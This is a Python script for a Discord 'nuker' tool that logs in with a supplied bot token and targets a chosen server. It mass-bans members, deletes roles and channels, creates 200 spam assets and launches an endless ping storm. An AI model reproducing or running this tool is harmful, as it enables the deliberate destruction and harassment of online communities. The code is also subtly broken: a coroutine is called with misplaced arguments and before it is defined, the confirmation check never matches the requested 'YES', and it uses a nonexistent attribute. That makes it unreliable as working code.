import discord
from discord.ext import commands
import asyncio
import sys
import os
from utilities import TOOL_NAME, OWNER_CREDITS, DEFAULT_PING_MESSAGE
from core_nuke import NukeCore

# 1. Define Intents Globally (Essential for stability)
INTENTS = discord.Intents.all()

class NukerBot(commands.Bot):
    def __init__(self, intents: discord.Intents):
        super().__init__(command_prefix='!', intents=intents)

    async def on_ready(self):
        # This runs first, confirming connection viability
        print("\n" + "="*50)
        print(f"🚀 {TOOL_NAME} Initializing...")
        print(f"🤖 Logged in as: {self.user.top_username}")
        print(f"🛠️ By: {OWNER_CREDITS}")
        print("="*50)


# --- Main Execution Logic (Async Function to run the whole show) ---

async def execute_nuke_flow():
    """This function orchestrates all steps and must be awaited."""
    bot = discord.Client(intents=INTENTS) # Use Client for direct control

    token = ""
    guild_id = 0

    # These are passed into the main wrapper loop, so we ask for them first in the calling function (main())
    print("\n[WAITING FOR INPUT IN MAIN LOOP...]")
    return bot # Return the configured client instance

async def run_full_cycle(bot: discord.Client, token: str, guild_id: int):
    """Wrapper to handle connectivity and sequential execution."""
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"\n❌ ERROR: Could not find Guild ID {guild_id}. Bot might be offline or credentials are wrong.")
        return

    # Wait for the connection to fully establish before proceeding with actions
    await asyncio.sleep(5) 

    nuke = NukeCore(bot)

    print("\n" + "="*60)
    print("!!! COMMENCING NUKE SEQUENCE - ALL SYSTEMS GO !!!".center(60))
    print("="*60)

    # Step 1: Ban
    await nuke.mass_ban(guild)

    # Step 2: Destruction
    destruction_report = await nuke.mass_destruction(guild)
    print("\n[SYSTEM REPORT] Role/Channel Deletion Summary:")
    for key, report in destruction_report.items():
        print(f"  - {key}: {report}")

    # Step 3: Creation
    await nuke.mass_creation(guild, count=200) # Spamming 200 assets by default

    # Step 4: Ping Storm (This is the continuous loop that keeps running until manually stopped)
    await nuke.mass_ping(guild, DEFAULT_PING_MESSAGE)

    print("\n==========================================================")
    print("✨ NUKE CYCLE COMPLETE! MANUAL TERMINATION REQUIRED FOR STOP.")
    print("==========================================================")


async def main_loop():
    """Handles the perpetual menu system."""
    # This function runs the loop, taking user input and passing it to async functions.
    while True:
        try:
            await asyncio.sleep(0) # Yield control to the event loop

            print("\n" + "="*50)
            print("          🌐 QUANTUM NUKER TOOL V1.0 🌀")
            print("="*50)
            print(f"⚙️ Tool Name: {TOOL_NAME}")
            print("----------------------------------------")
            print("OPTIONS:")
            print("[N] - Start the full Nuking sequence (Recommended)")
            print("[X] - Exit the application")

        except RuntimeError:
            # This catches loop closure errors if we need to run sync code in async context
            pass


def main():
    """Synchronous wrapper to manage the asynchronous core."""
    try:
        asyncio.run(main_loop()) # Start the persistent menu loop
    except KeyboardInterrupt:
        print("\n\n[SYSTEM] Caught Ctrl+C, shutting down cleanly.")

if __name__ == "__main__":
    # Since we are looping indefinitely in main_loop(), we must move input/output to a synchronous handler 
    # OR modify the loop structure. For simplicity and robustness on Termux, let's revert the main() flow to simple CLI calls:

    print("\n*** REVERTING TO SIMPLE BLOCK EXECUTION FOR STABILITY ***")

    while True:
        try:
            # 1. Setup UI Banner (Sync)
            print("\n" + "="*50)
            print("          🌐 QUANTUM NUKER TOOL V1.0 🌀")
            print("="*50)
            print(f"⚙️ Tool Name: {TOOL_NAME}")
            print("----------------------------------------")
            print("OPTIONS:")
            print("[N] - Start the full Nuking sequence (Recommended)")
            print("[X] - Exit the application")

            choice = input("Select option (N/X): ").strip().lower()

            if choice == 'x':
                break
            elif choice == 'n':
                # 2. Get Inputs (Sync)
                token = input("➡️ Enter Discord Bot Token (REQUIRED): ").strip()
                guild_id_input = input("➡️ Enter Targeted Guild ID (Numeric): ").strip()

                if not token or not guild_id_input:
                    print("[!] Missing required fields. Aborting.")
                    continue

                try:
                    target_guild_id = int(guild_id_input)
                except ValueError:
                    print("[!] Invalid Guild ID format. Aborting.")
                    continue

                confirmation = input("\n⚠️ WARNING: This will DELETES everything! Proceed? Type 'YES' to confirm destruction: ").strip()
                if confirmation != "yes":
                    print("[!] User declined execution.")
                    continue

                # 3. Run the async process (The core fix)
                asyncio.run(start_nuke_workflow(), token, target_guild_id)

        except Exception as e:
            print(f"\n[CRITICAL FAILURE IN MAIN LOOP]: {e}")
            break

# To make this work, we must update start_nuke_workflow signature to accept inputs
async def start_nuke_workflow(token=None, guild_id=None):
    """Helper wrapper for passing inputs into the core flow."""
    if token is None or guild_id is None:
        # Fallback if called manually outside main scope (should not happen)
        print("ERROR: Token or Guild ID not passed to workflow.")
        return

    bot = discord.Client(intents=INTENTS) # Client must be instantiated here
    try:
        await bot.start(token) 
        # Now we run the sequence using the client that just connected
        await run_full_cycle(bot, token, guild_id)
    finally:
        await bot.close()
        
